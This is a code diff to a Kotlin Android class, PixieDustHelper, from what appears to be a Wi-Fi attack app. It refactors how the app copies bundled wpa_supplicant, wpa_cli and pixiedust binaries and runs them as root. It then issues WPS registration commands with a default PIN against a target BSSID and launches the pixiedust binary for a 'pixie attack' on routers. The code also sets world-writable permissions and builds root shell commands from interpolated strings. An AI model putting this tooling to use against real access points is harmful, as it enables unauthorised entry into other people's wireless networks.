@@ -19,6 +19,7 @@ import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import java.io.BufferedReader
+import java.io.File
 import java.io.InputStreamReader
 import java.io.InterruptedIOException
 
@@ -282,71 +283,44 @@ class PixieDustHelper(
         }
     }
 
-    fun copyBinariesFromAssets() {
-        if (copyingJob?.isActive == true) {
-            Log.w(TAG, "Binary copying already in progress")
-            return
-        }
-
-        copyingJob = scope.launch {
+    suspend fun copyBinariesFromAssets(): Boolean {
+        return withContext(Dispatchers.IO) {
             try {
                 callbacks.onProgressUpdate(context.getString(R.string.pixiedust_copying_binaries))
 
-                val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"
+                val arch = getArchitectureSuffix()
                 val binaries = listOf(
                     "wpa_supplicant$arch",
                     "wpa_cli$arch",
-                    "pixiedust$arch",
-                    CONFIG_FILE
+                    "pixiedust$arch"
                 )
 
-                val libraries = if (arch.isEmpty()) {
-                    listOf(
-                        "libssl.so.1.1",
-                        "libssl.so.3",
-                        "libcrypto.so.1.1",
-                        "libcrypto.so.3",
-                        "libnl-3.so",
-                        "libnl-genl-3.so",
-                        "libnl-route-3.so"
-                    )
-                } else {
-                    listOf(
-                        "libssl.so.1.1",
-                        "libssl.so.3",
-                        "libcrypto.so.1.1",
-                        "libcrypto.so.3",
-                        "libnl-3.so-32",
-                        "libnl-genl-3.so-32",
-                        "libnl-route-3.so"
-                    )
-                }
+                val assetManager = context.assets
 
-                binaries.forEach { fileName ->
-                    val targetFileName = when (fileName) {
-                        "wpa_cli$arch" -> "wpa_cli_n$arch"
-                        else -> fileName
-                    }
-                    if (copyAssetToInternalStorage(fileName, targetFileName)) {
-                        Shell.cmd("chmod 755 $binaryDir/$targetFileName").exec()
+                for (binary in binaries) {
+                    try {
+                        assetManager.open(binary).use { inputStream ->
+                            val outputFile = File(binaryDir, binary)
+                            outputFile.outputStream().use { outputStream ->
+                                inputStream.copyTo(outputStream)
+                            }
+                            outputFile.setExecutable(true)
+                            outputFile.setReadable(true)
+                            outputFile.setWritable(true)
+                        }
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Failed to copy binary: $binary", e)
+                        callbacks.onLogEntry(LogEntry("Failed to copy $binary: ${e.message}", LogColorType.ERROR))
+                        return@withContext false
                     }
                 }
 
-                libraries.forEach { libName ->
-                    copyAssetToInternalStorage(libName, libName)
-                    Shell.cmd("chmod 755 $binaryDir/$libName").exec()
-                }
-
-                if (arch.isNotEmpty()) {
-                    createLibrarySymlinks()
-                }
                 callbacks.onProgressUpdate(context.getString(R.string.pixiedust_binaries_ready))
-
+                true
             } catch (e: Exception) {
                 Log.e(TAG, "Error copying binaries", e)
-                callbacks.onAttackFailed(context.getString(R.string.pixiedust_error_copying_binaries), -10)
-            } finally {
-                copyingJob = null
+                callbacks.onLogEntry(LogEntry("Binary copy error: ${e.message}", LogColorType.ERROR))
+                false
             }
         }
     }
@@ -1154,10 +1128,11 @@ class PixieDustHelper(
     }
 
     private fun getSocketDirectory(): String {
-        return if (Build.VERSION.SDK_INT >= 28) {
-            "/data/vendor/wifi/wpa/wififrankenstein/"
-        } else {
-            "/data/misc/wifi/wififrankenstein/"
+        val packageName = context.packageName.replace(".", "_")
+        return when {
+            Build.VERSION.SDK_INT >= 30 -> "/data/vendor/wifi/wpa/$packageName/"
+            Build.VERSION.SDK_INT >= 28 -> "/data/vendor/wifi/wpa/$packageName/"
+            else -> "/data/misc/wifi/$packageName/"
         }
     }
 
@@ -1167,37 +1142,56 @@ class PixieDustHelper(
                 Log.d(TAG, "Starting completely isolated wpa_supplicant on interface $interfaceName")
                 callbacks.onLogEntry(LogEntry("Starting isolated wpa_supplicant on $interfaceName", LogColorType.INFO))
 
-                val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"
+                val arch = getArchitectureSuffix()
 
                 Shell.cmd("rm -rf $socketDir").exec()
                 Shell.cmd("mkdir -p $socketDir").exec()
                 Shell.cmd("chmod 777 $socketDir").exec()
 
                 val isolatedConfigDir = "$binaryDir/isolated_config"
-                var isolatedConfigPath = "$isolatedConfigDir/wpa_supplicant.conf"
+                Shell.cmd("rm -rf $isolatedConfigDir").exec()
+                Shell.cmd("mkdir -p $isolatedConfigDir").exec()
+                Shell.cmd("chmod 755 $isolatedConfigDir").exec()
+
+                val isolatedConfigPath = "$isolatedConfigDir/wpa_supplicant.conf"
 
                 callbacks.onLogEntry(LogEntry("Creating isolated configuration...", LogColorType.INFO))
-                createCompletelyIsolatedConfig(isolatedConfigPath)
+                createCompletelyIsolatedConfig(isolatedConfigPath, socketDir)
 
                 delay(1000)
 
                 if (!Shell.cmd("test -f $isolatedConfigPath").exec().isSuccess) {
-                    callbacks.onLogEntry(LogEntry("Config file not created, using default config", LogColorType.ERROR))
-                    isolatedConfigPath = "$binaryDir/$CONFIG_FILE"
+                    callbacks.onLogEntry(LogEntry("Config file not created, using fallback config", LogColorType.ERROR))
+                    createConfigViaShell(isolatedConfigPath, socketDir)
+                    delay(500)
                 }
 
-                val command = """
-                cd $binaryDir && \
-                export LD_LIBRARY_PATH=$binaryDir && \
-                export WPA_TRACE_LEVEL=99 && \
-                unset ANDROID_DATA && \
-                unset ANDROID_ROOT && \
-                unset ANDROID_STORAGE && \
-                export HOME=$isolatedConfigDir && \
-                export TMPDIR=$isolatedConfigDir && \
-                ./wpa_supplicant$arch -dd -K -Dnl80211,wext,hostapd,wired -i $interfaceName -c$isolatedConfigPath -O$socketDir -P$isolatedConfigDir/wpa_supplicant.pid
-            """.trimIndent()
+                val ldLibraryPath = if (Build.VERSION.SDK_INT >= 28) {
+                    "$binaryDir:/system/lib64:/system/lib"
+                } else {
+                    binaryDir
+                }
 
+                val command = when {
+                    Build.VERSION.SDK_INT >= 28 -> """
+                    cd $binaryDir && \
+                    export LD_LIBRARY_PATH=$ldLibraryPath && \
+                    export WPA_TRACE_LEVEL=99 && \
+                    unset ANDROID_DATA && \
+                    unset ANDROID_ROOT && \
+                    unset ANDROID_STORAGE && \
+                    export HOME=$isolatedConfigDir && \
+                    export TMPDIR=$isolatedConfigDir && \
+                    ./wpa_supplicant$arch -dd -K -Dnl80211,wext -i $interfaceName -c$isolatedConfigPath -O$socketDir -P$isolatedConfigDir/wpa_supplicant.pid
+                """.trimIndent()
+                    else -> """
+                    cd $binaryDir && \
+                    export LD_LIBRARY_PATH=$ldLibraryPath && \
+                    ./wpa_supplicant$arch -dd -K -Dnl80211,wext -i $interfaceName -c$isolatedConfigPath -O$socketDir -P$isolatedConfigDir/wpa_supplicant.pid
+                """.trimIndent()
+                }
+
+                Log.d(TAG, "Starting wpa_supplicant with command: $command")
                 supplicantProcess = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
                 supplicantOutput = BufferedReader(InputStreamReader(supplicantProcess!!.inputStream))
 
@@ -1216,11 +1210,21 @@ class PixieDustHelper(
                 }
 
                 val socketFile = "$socketDir/$interfaceName"
+                Log.d(TAG, "Waiting for control socket: $socketFile")
+
                 val startTime = System.currentTimeMillis()
                 while (System.currentTimeMillis() - startTime < 15000) {
                     if (Shell.cmd("test -S $socketFile").exec().isSuccess) {
-                        Log.d(TAG, "Control socket created")
+                        Log.d(TAG, "Control socket created successfully")
                         callbacks.onLogEntry(LogEntry("Successfully started isolated wpa_supplicant", LogColorType.INFO))
+
+                        delay(2000)
+
+                        val testResult = Shell.cmd("ls -la $socketFile").exec()
+                        if (testResult.isSuccess) {
+                            callbacks.onLogEntry(LogEntry("Socket verification: ${testResult.out.joinToString()}", LogColorType.INFO))
+                        }
+
                         return@withContext true
                     }
                     delay(500)
@@ -1233,8 +1237,19 @@ class PixieDustHelper(
                 val psResult = Shell.cmd("ps aux | grep wpa_supplicant | grep -v grep").exec()
                 if (psResult.isSuccess && psResult.out.isNotEmpty()) {
                     callbacks.onLogEntry(LogEntry("wpa_supplicant process is running", LogColorType.INFO))
+                    psResult.out.forEach { processLine ->
+                        callbacks.onLogEntry(LogEntry("Process: $processLine", LogColorType.INFO))
+                    }
                 } else {
                     callbacks.onLogEntry(LogEntry("wpa_supplicant process not found", LogColorType.ERROR))
+                }
+
+                val socketCheckResult = Shell.cmd("ls -la $socketDir").exec()
+                if (socketCheckResult.isSuccess) {
+                    callbacks.onLogEntry(LogEntry("Socket directory contents:", LogColorType.INFO))
+                    socketCheckResult.out.forEach { line ->
+                        callbacks.onLogEntry(LogEntry(line, LogColorType.INFO))
+                    }
                 }
 
                 false
@@ -1246,82 +1261,67 @@ class PixieDustHelper(
         }
     }
 
-    private suspend fun createConfigViaShell(configPath: String) {
+    private suspend fun createConfigViaShell(configPath: String, socketDir: String) {
         withContext(Dispatchers.IO) {
             try {
-                callbacks.onLogEntry(LogEntry("Creating config via shell commands...", LogColorType.INFO))
+                callbacks.onLogEntry(LogEntry("Creating config via shell backup method", LogColorType.INFO))
 
-                val configDir = java.io.File(configPath).parent
+                val simpleConfig = """
+                ctrl_interface=$socketDir
+                update_config=1
+                
+            """.trimIndent()
 
-                val createCommands = listOf(
-                    "mkdir -p $configDir",
-                    "chmod 755 $configDir",
-                    "cat > $configPath << 'EOF'\nctrl_interface_group=wifi\nupdate_config=0",
-                    "chmod 644 $configPath"
-                )
+                Shell.cmd("echo '$simpleConfig' > $configPath").exec()
+                Shell.cmd("chmod 644 $configPath").exec()
 
-                createCommands.forEach { command ->
-                    val result = Shell.cmd(command).exec()
-                    if (!result.isSuccess) {
-                        Log.w(TAG, "Command failed: $command")
-                        callbacks.onLogEntry(LogEntry("Warning: $command failed", LogColorType.ERROR))
-                    }
-                    delay(100)
-                }
-
-                val verifyResult = Shell.cmd("test -f $configPath && echo 'EXISTS' || echo 'MISSING'").exec()
-                if (verifyResult.isSuccess && verifyResult.out.contains("EXISTS")) {
-                    callbacks.onLogEntry(LogEntry("Config created successfully via shell", LogColorType.SUCCESS))
-                } else {
-                    callbacks.onLogEntry(LogEntry("Config creation via shell failed", LogColorType.ERROR))
-                }
-
+                callbacks.onLogEntry(LogEntry("Fallback config created", LogColorType.INFO))
             } catch (e: Exception) {
-                Log.e(TAG, "Failed to create config via shell", e)
-                callbacks.onLogEntry(LogEntry("Shell config creation error: ${e.message}", LogColorType.ERROR))
+                Log.e(TAG, "Error creating fallback config", e)
             }
         }
     }
 
 
-    private suspend fun createCompletelyIsolatedConfig(configPath: String) {
+    private suspend fun createCompletelyIsolatedConfig(configPath: String, socketDir: String) {
         withContext(Dispatchers.IO) {
             try {
-                val isolatedConfig = """
-ctrl_interface_group=wifi
-update_config=0
-            """.trimIndent()
-
-                val configDir = java.io.File(configPath).parent
-
-                Shell.cmd("mkdir -p $configDir").exec()
-                Shell.cmd("chmod 755 $configDir").exec()
-
-                val tempConfigPath = "$binaryDir/temp_isolated_config.txt"
-
-                try {
-                    context.openFileOutput("temp_isolated_config.txt", Context.MODE_PRIVATE).use { output ->
-                        output.write(isolatedConfig.toByteArray())
-                    }
-
-                    Shell.cmd("cp $tempConfigPath $configPath").exec()
-                    Shell.cmd("chmod 644 $configPath").exec()
-                    Shell.cmd("rm -f $tempConfigPath").exec()
-
-                    val verifyResult = Shell.cmd("test -f $configPath && echo 'OK' || echo 'FAIL'").exec()
-                    if (!verifyResult.isSuccess || !verifyResult.out.contains("OK")) {
-                        throw Exception("Config file verification failed")
-                    }
-
-                } catch (e: Exception) {
-                    Log.w(TAG, "Standard method failed, trying shell method", e)
-                    createConfigViaShell(configPath)
+                val configContent = when {
+                    Build.VERSION.SDK_INT >= 28 -> """
+                    ctrl_interface=$socketDir
+                    ctrl_interface_group=wifi
+                    update_config=1
+                    device_name=Android_Pixie
+                    manufacturer=Android
+                    model_name=Android
+                    model_number=Android
+                    serial_number=Android
+                    device_type=10-0050F204-5
+                    p2p_no_group_iface=1
+                    wps_cred_processing=1
+                    
+                """.trimIndent()
+                    else -> """
+                    ctrl_interface=$socketDir
+                    update_config=1
+                    wps_cred_processing=1
+                    
+                """.trimIndent()
                 }
 
+                val configDir = configPath.substringBeforeLast("/")
+                Shell.cmd("mkdir -p $configDir").exec()
+
+                val result = Shell.cmd("cat > $configPath << 'EOF'\n$configContent\nEOF").exec()
+                if (result.isSuccess) {
+                    Shell.cmd("chmod 644 $configPath").exec()
+                    callbacks.onLogEntry(LogEntry("Config created: $configPath", LogColorType.INFO))
+                } else {
+                    callbacks.onLogEntry(LogEntry("Failed to create config: ${result.err.joinToString()}", LogColorType.ERROR))
+                }
             } catch (e: Exception) {
-                Log.e(TAG, "All config creation methods failed", e)
-                callbacks.onLogEntry(LogEntry("Failed to create isolated config: ${e.message}", LogColorType.ERROR))
-                callbacks.onLogEntry(LogEntry("Using default config as fallback", LogColorType.ERROR))
+                Log.e(TAG, "Error creating isolated config", e)
+                callbacks.onLogEntry(LogEntry("Config creation error: ${e.message}", LogColorType.ERROR))
             }
         }
     }
@@ -1636,12 +1636,22 @@ update_config=0
     private suspend fun performWpsRegistration(network: WpsNetwork, socketDir: String, interfaceName: String) {
         withContext(Dispatchers.IO) {
             try {
-                val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"
+                val arch = getArchitectureSuffix()
 
                 Log.d(TAG, "Starting WPS registration for BSSID: ${network.bssid}")
                 callbacks.onLogEntry(LogEntry("Starting WPS registration for ${network.bssid}", LogColorType.INFO))
 
                 val socketPath = "$socketDir/$interfaceName"
+                Log.d(TAG, "Waiting for control socket: $socketPath")
+
+                val startTime = System.currentTimeMillis()
+                while (System.currentTimeMillis() - startTime < 10000) {
+                    if (Shell.cmd("test -S $socketPath").exec().isSuccess) {
+                        Log.d(TAG, "Control socket found")
+                        break
+                    }
+                    delay(500)
+                }
 
                 if (!Shell.cmd("test -S $socketPath").exec().isSuccess) {
                     callbacks.onLogEntry(LogEntry("Control socket not found: $socketPath", LogColorType.ERROR))
@@ -1650,15 +1660,27 @@ update_config=0
 
                 val socketParam = " -g$socketDir/$interfaceName "
 
-                val commands = listOf(
-                    "( cmdpid=\$BASHPID; (sleep 2; kill \$cmdpid) & exec $binaryDir/wpa_cli_n$arch${socketParam}IFNAME=$interfaceName wps_reg ${network.bssid} $DEFAULT_PIN )",
-                    "( cmdpid=\$BASHPID; (sleep 2; kill \$cmdpid) & exec $binaryDir/wpa_cli_n$arch $socketParam wps_reg ${network.bssid} $DEFAULT_PIN )",
-                    "( cmdpid=\$BASHPID; (sleep 2; kill \$cmdpid) & exec $binaryDir/wpa_cli_n$arch --bssid ${network.bssid} --pin $DEFAULT_PIN )"
-                )
+                val commands = when {
+                    Build.VERSION.SDK_INT >= 28 -> listOf(
+                        "( cmdpid=\$\$; (sleep 3; kill \$cmdpid) & exec $binaryDir/wpa_cli_n$arch$socketParam IFNAME=$interfaceName wps_reg ${network.bssid} $DEFAULT_PIN )",
+                        "( cmdpid=\$\$; (sleep 3; kill \$cmdpid) & exec $binaryDir/wpa_cli_n$arch $socketParam wps_reg ${network.bssid} $DEFAULT_PIN )",
+                        "$binaryDir/wpa_cli_n$arch --bssid ${network.bssid} --pin $DEFAULT_PIN"
+                    )
+                    else -> listOf(
+                        "( cmdpid=\$\$; (sleep 3; kill \$cmdpid) & exec $binaryDir/wpa_cli_n$arch IFNAME=$interfaceName wps_reg ${network.bssid} $DEFAULT_PIN )",
+                        "( cmdpid=\$\$; (sleep 3; kill \$cmdpid) & exec $binaryDir/wpa_cli_n$arch wps_reg ${network.bssid} $DEFAULT_PIN )"
+                    )
+                }
 
                 var success = false
                 for ((index, cmd) in commands.withIndex()) {
-                    val command = "cd $binaryDir && export LD_LIBRARY_PATH=$binaryDir && $cmd"
+                    val ldLibraryPath = if (Build.VERSION.SDK_INT >= 28) {
+                        "$binaryDir:/system/lib64:/system/lib"
+                    } else {
+                        binaryDir
+                    }
+
+                    val command = "cd $binaryDir && export LD_LIBRARY_PATH=$ldLibraryPath && $cmd"
 
                     Log.d(TAG, "Trying WPS command variant ${index + 1}/${commands.size}: $cmd")
                     callbacks.onLogEntry(LogEntry("Trying WPS command variant ${index + 1}/${commands.size}", LogColorType.INFO))
@@ -1677,7 +1699,8 @@ update_config=0
                             while (outputReader.readLine().also { line = it } != null) {
                                 line?.let {
                                     outputLines.add(it)
-                                    parseWpaCliLine(it)
+                                    Log.d("WPA_CLI_OUT", it)
+                                    callbacks.onLogEntry(LogEntry("wpa_cli: $it", LogColorType.SUCCESS))
                                 }
                             }
                         } catch (e: Exception) {
@@ -1692,6 +1715,21 @@ update_config=0
                                 line?.let {
                                     errorLines.add(it)
                                     Log.w("WPA_CLI_ERR", it)
+
+                                    when {
+                                        it.contains("Usage:") -> {
+                                            callbacks.onLogEntry(LogEntry("Command syntax error: $it", LogColorType.ERROR))
+                                        }
+                                        it.contains("connect error") -> {
+                                            callbacks.onLogEntry(LogEntry("Connection error: $it", LogColorType.ERROR))
+                                        }
+                                        it.contains("No such process") -> {
+                                            callbacks.onLogEntry(LogEntry("Process cleanup: $it", LogColorType.INFO))
+                                        }
+                                        else -> {
+                                            callbacks.onLogEntry(LogEntry("wpa_cli error: $it", LogColorType.ERROR))
+                                        }
+                                    }
                                 }
                             }
                         } catch (e: Exception) {
@@ -1699,7 +1737,16 @@ update_config=0
                         }
                     }
 
+                    val timeoutJob = scope.async {
+                        delay(5000)
+                        if (isProcessAlive(process)) {
+                            Log.w(TAG, "wpa_cli timeout, killing process")
+                            process.destroy()
+                        }
+                    }
+
                     val exitCode = process.waitFor()
+                    timeoutJob.cancel()
 
                     outputJob.await()
                     errorJob.await()
@@ -1707,37 +1754,38 @@ update_config=0
                     outputReader.close()
                     errorReader.close()
 
-                    val hasUsageError = errorLines.any {
-                        it.contains("Usage:", ignoreCase = true) ||
-                                it.contains("Error", ignoreCase = true) ||
-                                it.contains("Invalid", ignoreCase = true)
-                    }
+                    Log.d(TAG, "wpa_cli variant ${index + 1} finished with exit code: $exitCode")
 
-                    val hasUnknownCommand = outputLines.any { it.contains("UNKNOWN COMMAND") }
-
-                    if (exitCode == 0 && !hasUsageError && !hasUnknownCommand) {
-                        callbacks.onLogEntry(LogEntry("WPS command variant ${index + 1} successful", LogColorType.SUCCESS))
+                    if (exitCode == 0 && errorLines.none { it.contains("Usage:") || it.contains("connect error") }) {
                         success = true
+                        callbacks.onLogEntry(LogEntry("WPS registration command succeeded", LogColorType.SUCCESS))
                         break
                     } else {
-                        callbacks.onLogEntry(LogEntry("WPS command variant ${index + 1} failed", LogColorType.ERROR))
-                        if (hasUnknownCommand) {
-                            callbacks.onLogEntry(LogEntry("Command not recognized by wpa_supplicant", LogColorType.ERROR))
+                        callbacks.onLogEntry(LogEntry("WPS command variant ${index + 1} failed (exit: $exitCode)", LogColorType.ERROR))
+
+                        if (errorLines.any { it.contains("Usage:") }) {
+                            callbacks.onLogEntry(LogEntry("Command syntax error - trying next variant", LogColorType.INFO))
+                            continue
+                        }
+
+                        if (errorLines.any { it.contains("connect error") }) {
+                            callbacks.onLogEntry(LogEntry("Socket connection error - trying next variant", LogColorType.INFO))
+                            continue
                         }
                     }
 
-                    delay(800)
+                    delay(1000)
                 }
 
                 if (success) {
                     callbacks.onLogEntry(LogEntry("WPS registration initiated successfully", LogColorType.SUCCESS))
                 } else {
-                    callbacks.onLogEntry(LogEntry("All ${commands.size} WPS command variants failed", LogColorType.ERROR))
+                    callbacks.onLogEntry(LogEntry("All WPS command variants failed", LogColorType.ERROR))
                 }
 
             } catch (e: Exception) {
-                Log.w(TAG, "WPS registration failed", e)
-                callbacks.onLogEntry(LogEntry("WPS registration failed: ${e.message}", LogColorType.ERROR))
+                Log.e(TAG, "Error during WPS registration", e)
+                callbacks.onLogEntry(LogEntry("WPS registration error: ${e.message}", LogColorType.ERROR))
             }
         }
     }
@@ -1976,9 +2024,15 @@ update_config=0
             try {
                 callbacks.onLogEntry(LogEntry("Executing pixiedust binary", LogColorType.INFO))
 
-                val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"
-                val command = "cd $binaryDir && export LD_LIBRARY_PATH=$binaryDir && " +
-                        "./pixiedust$arch --force ${data.toCommandArgs()}"
+                val arch = getArchitectureSuffix()
+                val ldLibraryPath = if (Build.VERSION.SDK_INT >= 28) {
+                    "$binaryDir:/system/lib64:/system/lib"
+                } else {
+                    binaryDir
+                }
+
+                val command = "cd $binaryDir && export LD_LIBRARY_PATH=$ldLibraryPath && " +
+                        "chmod 755 ./pixiedust$arch && ./pixiedust$arch --force ${data.toCommandArgs()}"
 
                 Log.d(TAG, "Executing pixie attack with command: $command")
 
@@ -2046,6 +2100,30 @@ update_config=0
                 callbacks.onLogEntry(LogEntry("PixieDust execution error: ${e.message}", LogColorType.ERROR))
                 null
             }
+        }
+    }
+
+    private fun getArchitectureSuffix(): String {
+        return try {
+            val osArch = System.getProperty("os.arch") ?: ""
+            val is64Bit = osArch.contains("64") ||
+                    osArch.contains("aarch64") ||
+                    osArch.contains("arm64")
+
+            when {
+                is64Bit -> ""
+                Build.VERSION.SDK_INT >= 28 -> {
+                    val supportedAbis = Build.SUPPORTED_ABIS
+                    val has64BitAbi = supportedAbis.any {
+                        it.contains("arm64") || it.contains("x86_64")
+                    }
+                    if (has64BitAbi) "" else "-32"
+                }
+                else -> "-32"
+            }
+        } catch (e: Exception) {
+            Log.w(TAG, "Error detecting architecture, defaulting to 32-bit", e)
+            "-32"
         }
     }
 
